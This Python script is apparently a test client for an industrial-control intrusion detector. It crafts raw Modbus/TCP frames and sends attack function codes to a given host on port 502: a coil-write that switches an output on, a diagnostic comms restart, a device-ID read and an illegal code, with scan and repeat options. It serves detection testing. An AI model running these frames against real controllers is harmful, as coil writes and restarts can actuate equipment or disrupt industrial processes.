#!/usr/bin/env python3
# CC-51: raw Modbus/TCP function-code attack client. Crafts arbitrary (incl. dangerous/illegal) function codes so we
# can prove CARS's brain classifies by OPERATION, not just the 5-tuple. Modbus/TCP: MBAP(7B: tid,proto=0,len,unit)+PDU.
# The proto-id (0x0000) lands at byte offset 2 and the function code at offset 7 — exactly what the Snort DPI rules anchor on.
import socket, struct, argparse
def frame(fc, data=b'', tid=1, unit=1):
    pdu = bytes([fc & 0xFF]) + data
    mbap = struct.pack('>HHHB', tid, 0x0000, len(pdu) + 1, unit)   # proto-id 0x0000 @ off2 ; FC @ off7
    return mbap + pdu
ATTACKS = {
    'coil':    (0x05, bytes.fromhex('0000FF00')),   # FC5  write single coil ON     -> CONTROL (direct actuation)
    'diag':    (0x08, bytes.fromhex('00010000')),   # FC8  sub1 = restart comms     -> DIAG (dangerous)
    'program': (0x2B, bytes.fromhex('0E0100')),     # FC43 MEI read device id       -> PROGRAM
    'illegal': (0x64, bytes.fromhex('0000')),       # FC100 undefined (>43)         -> ILLEGAL
}
def send(host, fc, data, tid=1):
    try:
        s = socket.create_connection((host, 502), timeout=3)
        s.sendall(frame(fc, data, tid))
        try: r = s.recv(64)
        except Exception: r = b''
        s.close()
        return "sent FC=0x%02X(%d) resp=%s" % (fc, fc, (r.hex()[:20] or 'none'))
    except Exception as e:
        return "FC=0x%02X send FAILED: %s" % (fc, e)
if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument('--host', required=True)
    ap.add_argument('--attack', choices=list(ATTACKS) + ['scan'])
    ap.add_argument('--fc', type=lambda x: int(x, 0))
    ap.add_argument('--count', type=int, default=1)
    a = ap.parse_args()
    if a.attack == 'scan':
        for fc in (0x05, 0x08, 0x2B, 0x64, 0x11):
            print(send(a.host, fc, b'\x00\x00', fc))
    elif a.attack:
        fc, data = ATTACKS[a.attack]
        for i in range(a.count): print(send(a.host, fc, data, i + 1))
    else:
        for i in range(a.count): print(send(a.host, a.fc or 0x64, b'\x00\x00', i + 1))
